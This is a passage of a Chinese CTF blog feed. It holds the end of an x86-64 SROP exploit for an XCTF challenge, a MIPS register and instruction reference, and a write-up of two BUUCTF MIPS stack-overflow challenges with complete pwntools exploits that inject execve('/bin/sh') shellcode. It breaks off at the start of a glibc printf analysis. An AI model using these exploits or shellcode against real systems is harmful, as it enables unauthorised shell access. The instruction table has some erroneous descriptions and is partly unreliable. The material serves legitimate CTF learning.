class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./only_read&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000098fb6: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000011c3f9: 0f05c3;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">tar=<span class="number">0x404088</span></span><br><span class="line">bss=<span class="number">0x404800</span></span><br><span class="line">read=<span class="number">0x401142</span></span><br><span class="line">rbp=<span class="number">0x40111D</span></span><br><span class="line">got=<span class="number">0x404000</span><span class="comment">#--&gt;0x5f</span></span><br><span class="line">leave=<span class="number">0x40115D</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401158&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(tar+<span class="number">0x80</span>-<span class="number">0x8</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=p64(bss+<span class="number">0x100</span>-<span class="number">0x90</span>)+p64(read+<span class="number">4</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">0x100</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">s=SigreturnFrame()</span><br><span class="line">bin_sh=<span class="number">0x404710</span></span><br><span class="line">s.rax=<span class="number">0x3b</span></span><br><span class="line">s.rdi=bin_sh</span><br><span class="line">s.rdx=<span class="number">0</span></span><br><span class="line">s.rsi=<span class="number">0</span></span><br><span class="line">s.rip=<span class="number">0x401044</span></span><br><span class="line">payload =p64(bss).ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(got+<span class="number">0x80</span>)+p64(read)</span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x160</span>+p64(rbp)+p64(<span class="number">0xf</span>+<span class="number">0x80</span>)+p64(read)+<span class="built_in">bytes</span>(s)[<span class="number">8</span>:]</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;\x5f&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips基础</title>
      <link href="/2025/08/14/%E5%BC%82%E6%9E%B6%E6%9E%84/mips%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/08/14/%E5%BC%82%E6%9E%B6%E6%9E%84/mips%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="mips基础"><a href="#mips基础" class="headerlink" title="mips基础"></a>mips基础</h1><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><table><thead><tr><th>REGISTER</th><th>NAME</th><th>USAGE</th></tr></thead><tbody><tr><td>$0</td><td>$zero</td><td>常量0(constant value 0)</td></tr><tr><td>$1</td><td>$at</td><td>保留给汇编器(Reserved for assembler)</td></tr><tr><td>$2-$3</td><td>$v0-$v1</td><td>函数调用返回值(values for results and expression evaluation)</td></tr><tr><td>$4-$7</td><td>$a0-$a3</td><td>函数调用参数(arguments)</td></tr><tr><td>$8-$15</td><td>$t0-$t7</td><td>暂时的(或随便用的)</td></tr><tr><td>$16-$23</td><td>$s0-$s7</td><td>保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td></tr><tr><td>$24-$25</td><td>$t8-$t9</td><td>暂时的(或随便用的)</td></tr><tr><td>$28</td><td>$gp</td><td>全局指针(Global Pointer)</td></tr><tr><td>$29</td><td>$sp</td><td>堆栈指针(Stack Pointer)</td></tr><tr><td>$30</td><td>$fp</td><td>帧指针(Frame Pointer)</td></tr><tr><td>$31</td><td>$ra</td><td>返回地址(return address)</td></tr></tbody></table><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>mips 没有push 和 pop 指令。而且qemu 和硬件不支持NX、alsr，所以很多时候可以直接写shellcode。</p><p>指令太多了…</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>指令</td><td>功能</td><td>应用实例</td></tr><tr><td>LB</td><td>从存储器中读取一个字节的数据到寄存器中</td><td>LB R1, 0(R2)</td></tr><tr><td>LH</td><td>从存储器中读取半个字的数据到寄存器中</td><td>LH R1, 0(R2)</td></tr><tr><td>LW</td><td>从存储器中读取一个字的数据到寄存器中</td><td>LW R1, 0(R2)</td></tr><tr><td>LD</td><td>从存储器中读取双字的数据到寄存器中</td><td>LD R1, 0(R2)</td></tr><tr><td>L.S</td><td>从存储器中读取单精度浮点数到寄存器中</td><td>L.S R1, 0(R2)</td></tr><tr><td>L.D</td><td>从存储器中读取双精度浮点数到寄存器中</td><td>L.D R1, 0(R2)</td></tr><tr><td>LBU</td><td>功能与LB指令相同，但读出的是不带符号的数据</td><td>LBU R1, 0(R2)</td></tr><tr><td>LHU</td><td>功能与LH指令相同，但读出的是不带符号的数据</td><td>LHU R1, 0(R2)</td></tr><tr><td>LWU</td><td>功能与LW指令相同，但读出的是不带符号的数据</td><td>LWU R1, 0(R2)</td></tr><tr><td>SB</td><td>把一个字节的数据从寄存器存储到存储器中</td><td>SB R1, 0(R2)</td></tr><tr><td>SH</td><td>把半个字节的数据从寄存器存储到存储器中</td><td>SH R1，0(R2)</td></tr><tr><td>SW</td><td>把一个字的数据从寄存器存储到存储器中</td><td>SW R1, 0(R2)</td></tr><tr><td>SD</td><td>把两个字节的数据从寄存器存储到存储器中</td><td>SD R1, 0(R2)</td></tr><tr><td>S.S</td><td>把单精度浮点数从寄存器存储到存储器中</td><td>S.S R1, 0(R2)</td></tr><tr><td>S.D</td><td>把双精度数据从存储器存储到存储器中</td><td>S.D R1, 0(R2)</td></tr><tr><td>DADD</td><td>把两个定点寄存器的内容相加，也就是定点加</td><td>DADD R1,R2,R3</td></tr><tr><td>DADDI</td><td>把一个寄存器的内容加上一个立即数</td><td>DADDI R1,R2,#3</td></tr><tr><td>DADDU</td><td>不带符号的加</td><td>DADDU R1,R2,R3</td></tr><tr><td>DADDIU</td><td>把一个寄存器的内容加上一个无符号的立即数</td><td>DADDIU R1,R2,#3</td></tr><tr><td>ADD.S</td><td>把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td><td>ADD.S F0,F1,F2</td></tr><tr><td>ADD.D</td><td>把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td><td>ADD.D F0,F1,F2</td></tr><tr><td>ADD.PS</td><td>两个单精度浮点数相加，结果是单精度浮点数</td><td>ADD.PS F0,F1,F2</td></tr><tr><td>DSUB</td><td>两个寄存器的内容相减，也就是定点数的减</td><td>DSUB R1,R2,R3</td></tr><tr><td>DSUBU</td><td>不带符号的减</td><td>DSUBU R1,R2,R3</td></tr><tr><td>SUB.S</td><td>一个双精度浮点数减去一个单精度浮点数，结果为单精度</td><td>SUB.S F1,F2,F3</td></tr><tr><td>SUB.D</td><td>一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td><td>SUB.D F1,F2,F3</td></tr><tr><td>SUB.PS</td><td>两个单精度浮点数相减</td><td>SUB.SP F1,F2,F3</td></tr><tr><td>DDIV</td><td>两个定点寄存器的内容相除，也就是定点除</td><td>DDIV Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DDIVU</td><td>不带符号的除法运算</td><td>DDIVU Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DIV.S</td><td>一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td><td>DIV.S F1,F2,F3</td></tr><tr><td>DIV.D</td><td>一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td><td>DIV.D F1,F2,F3</td></tr><tr><td>DIV.PS</td><td>两个单精度浮点数相除，结果为单精度</td><td>DIV.PS F1,F2,F3</td></tr><tr><td>DMUL</td><td>两个定点寄存器的内容相乘，也就是定点乘</td><td>DMUL Ｒ1,Ｒ2,Ｒ3</td></tr><tr><td>DMULU</td><td>不带符号的乘法运算</td><td>DMULU R1,R2,R3</td></tr><tr><td>MUL.S</td><td>一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td><td>DMUL.S F1,F2,F3</td></tr><tr><td>MUL.D</td><td>一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td><td>DMUL.D F1,F2,F3</td></tr><tr><td>MUL.PS</td><td>两个单精度浮点数相乘，结果为单精度浮点数</td><td>DMUL.PS F1,F2,F3</td></tr><tr><td>AND</td><td>与运算，两个寄存器中的内容相与</td><td>ANDＲ1,Ｒ2,Ｒ3</td></tr><tr><td>ANDI</td><td>一个寄存器中的内容与一个立即数相与</td><td>ANDIＲ1,Ｒ2,#3</td></tr><tr><td>OR</td><td>或运算，两个寄存器中的内容相或</td><td>ORＲ1,Ｒ2,Ｒ3</td></tr><tr><td>ORI</td><td>一个寄存器中的内容与一个立即数相或</td><td>ORIＲ1,Ｒ2,#3</td></tr><tr><td>XOR</td><td>异或运算，两个寄存器中的内容相异或</td><td>XORＲ1,Ｒ2,Ｒ3</td></tr><tr><td>XORI</td><td>一个寄存器中的内容与一个立即数异或</td><td>XORIＲ1,Ｒ2,#3</td></tr><tr><td>BEQZ</td><td>条件转移指令，当寄存器中内容为0时转移发生</td><td>BEQZ R1,0</td></tr><tr><td>BENZ</td><td>条件转移指令，当寄存器中内容不为0时转移发生</td><td>BNEZ R1,0</td></tr><tr><td>BEQ</td><td>条件转移指令，当两个寄存器内容相等时转移发生</td><td>BEQ R1,R2</td></tr><tr><td>BNE</td><td>条件转移指令，当两个寄存器中内容不等时转移发生</td><td>BNE R1,R2</td></tr><tr><td>J</td><td>直接跳转指令，跳转的地址在指令中</td><td>J name</td></tr><tr><td>JR</td><td>使用寄存器的跳转指令，跳转地址在寄存器中</td><td>JR R1</td></tr><tr><td>JAL</td><td>直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中</td><td>JAL R1 name</td></tr><tr><td>JALR</td><td>使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中</td><td>JALR R1</td></tr><tr><td>MOV.S</td><td>把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td>MOV.S F0,F1</td></tr><tr><td>MOV.D</td><td>把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td><td>MOV.D F0,F1</td></tr><tr><td>MFC0</td><td>把一个数据从通用寄存器复制到特殊寄存器</td><td>MFC0 R1,R2</td></tr><tr><td>MTC0</td><td>把一个数据从特殊寄存器复制到通用寄存器</td><td>MTC0 R1,R2</td></tr><tr><td>MFC1</td><td>把一个数据从定点寄存器复制到浮点寄存器</td><td>MFC1 R1,F1</td></tr><tr><td>MTC1</td><td>把一个数据从浮点寄存器复制到定点寄存器</td><td>MTC1 R1,F1</td></tr><tr><td>LUI</td><td>把一个16位的立即数填入到寄存器的高16位，低16位补零</td><td>LUI R1,#42</td></tr><tr><td>DSLL</td><td>双字逻辑左移</td><td>DSLL R1,R2,#2</td></tr><tr><td>DSRL</td><td>双字逻辑右移</td><td>DSRL R1,R2,#2</td></tr><tr><td>DSRA</td><td>双字算术右移</td><td>DSRA R1,R2,#2</td></tr><tr><td>DSLLV</td><td>可变的双字逻辑左移</td><td>DSLLV R1,R2,#2</td></tr><tr><td>DSRLV</td><td>可变的双字罗伊右移</td><td>DSRLV R1,R2,#2</td></tr><tr><td>DSRAV</td><td>可变的双字算术右移</td><td>DSRAV R1,R2,#2</td></tr><tr><td>SLT</td><td>如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td><td>SLT R1,R2,R3</td></tr><tr><td>SLTI</td><td>如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td><td>SLTI R1,R2,#23</td></tr><tr><td>SLTU</td><td>功能与SLT一致，但是带符号的</td><td>SLTU R1,R2,R3</td></tr><tr><td>SLTUI</td><td>功能与SLT一致，但不带符号</td><td>SLTUI R1,R2,R3</td></tr><tr><td>MOVN</td><td>如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td><td>MOVN R1,R2,R3</td></tr><tr><td>MOVZ</td><td>如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td><td>MOVZ R1,R2,R3</td></tr><tr><td>TRAP</td><td>根据地址向量转入管态</td><td></td></tr><tr><td>ERET</td><td>从异常中返回到用户态</td><td></td></tr><tr><td>MADD.S</td><td>一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td><td></td></tr><tr><td>MADD.D</td><td>一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td><td></td></tr><tr><td>MADD.PS</td><td>两个单精度浮点数相乘加，结果为单精度</td><td></td></tr></tbody></table><h3 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h3><p><a href="https://syscalls.w3challs.com/">syscall</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips练习</title>
      <link href="/2025/08/14/%E5%BC%82%E6%9E%B6%E6%9E%84/mips%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
      <url>/2025/08/14/%E5%BC%82%E6%9E%B6%E6%9E%84/mips%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="mips-题目练习"><a href="#mips-题目练习" class="headerlink" title="mips-题目练习"></a>mips-题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。</p><p>这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。</p><h2 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h2><p>这是一道<code>ret2shellcode</code> 的题目，非常的经典. 因为mips架构,不会开启NX 和 ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.</p><p>但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png" alt="mian函数"></p><p>非常简单的程序,没有什么利用点,看<code>vuln()</code></p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png" alt="vuln函数"></p><p>发现溢出漏洞了，可以修改返回地址，但是要看汇编确定<code>$ra</code>的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png" alt="vuln函数汇编"></p><p>说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。</p><p>进入之后，先把<code>$sp</code>往上移动0x40,然后分别把<code>$ra</code>和<code>$fp</code>放在<code>$sp+0x3c</code>和<code>$sp+0x38</code> 的位置.</p><p>在read时,会往<code>$sp+0x18</code>的位置读入0x200字节.所以输入<code>0x20</code>字节数据后就可以覆盖<code>$fp</code>和<code>$ra</code>.</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><ol><li>之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.</li><li>所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.</li><li>如何控制read 的buf呢?在<code>0x40080c</code>的位置,有两条指令,分别是从栈上取出保存的<code>$fp</code>和<code>$ra</code>,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过<code>$fp</code>来计算buf 的,所以控制了<code>$fp</code>,就控制了buf.</li><li>那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为<code>$fp</code>和<code>$ra</code>都是通过<code>$sp</code>寻找的,所以要特别关注<code>$sp</code>的变化,发现在read的结束之后又一条指令<code>move $sp, $fp</code> ,这会是<code>$sp</code>移到<code>$fp</code>的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26700</span>)</span><br><span class="line"></span><br><span class="line">name=<span class="string">&quot;a&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span>+p32(<span class="number">0x00410B80</span>+<span class="number">0x18</span>)+p32(<span class="number">0x004007E0</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">addiu $sp, -0x40</span></span><br><span class="line"><span class="string">li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">la $a0, -12($sp)</span></span><br><span class="line"><span class="string">li $v0, 4011</span></span><br><span class="line"><span class="string">move $a1, $zero</span></span><br><span class="line"><span class="string">move $a2, $zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;name: \n&quot;</span>,name)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x00410Bb0</span>+<span class="number">0x28</span>)+shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h2><p>一回生,二回熟.再次看到同样,或者类似的read就非常得心应手</p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png" alt="main函数"></p><p>表面上是一个菜单,实际上核心只有description ,直接点进去看</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png" alt="description"></p><p>继续</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png" alt="vul汇编"></p><p>直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法</p><h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><ol><li>那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.</li><li>所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.</li><li>第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是<code>p32(bss_add+0x18+0x40)</code></li><li>0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.</li></ol><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;mips&quot;</span></span><br><span class="line"><span class="comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26779</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">op</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">bss=<span class="number">0x004115F0</span></span><br><span class="line">name=<span class="string">b&quot;a&quot;</span>*<span class="number">4</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x38</span>+p32(bss+<span class="number">0x10</span>)+p32(<span class="number">0x00400F50</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">addiu $sp, -0x40</span></span><br><span class="line"><span class="string">li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">la $a0, -12($sp)</span></span><br><span class="line"><span class="string">li $v0, 4011</span></span><br><span class="line"><span class="string">move $a1, $zero</span></span><br><span class="line"><span class="string">move $a2, $zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;here:\n&quot;</span>,name)</span><br><span class="line">menu(<span class="number">7</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;feeling:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(bss+<span class="number">0x10</span>+<span class="number">0x18</span>+<span class="number">0x40</span>)+shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. </p><p>不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.</p><p>第二道题直接给了uClibc,可以直接写.</p>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串研究</title>
      <link href="/2025/08/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/"/>
      <url>/2025/08/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串研究–一次性写的秘密"><a href="#格式化字符串研究–一次性写的秘密" class="headerlink" title="格式化字符串研究–一次性写的秘密"></a>格式化字符串研究–一次性写的秘密</h1><h2 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h2><h3 id="printf"><a href="#printf" class="headerlink" title="__printf"></a>__printf</h3><p>因为printf 函数，会调用__printf函数。我们直接来看该函数<br>它在&#x2F;stdio-common&#x2F;printf.c 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，它主要就是调用了__vfprintf_internal函数，继续追踪</p><h3 id="vfprintf-internal"><a href="#vfprintf-internal" class="headerlink" title="vfprintf_internal"></a>vfprintf_internal</h3><p>这个文件在&#x2F;stdio-common&#x2F;vfprintf_internal.c </p><h4 id="宏相关定义"><a href="#宏相关定义" class="headerlink" title="宏相关定义"></a>宏相关定义</h4><p>在148行，有一个宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 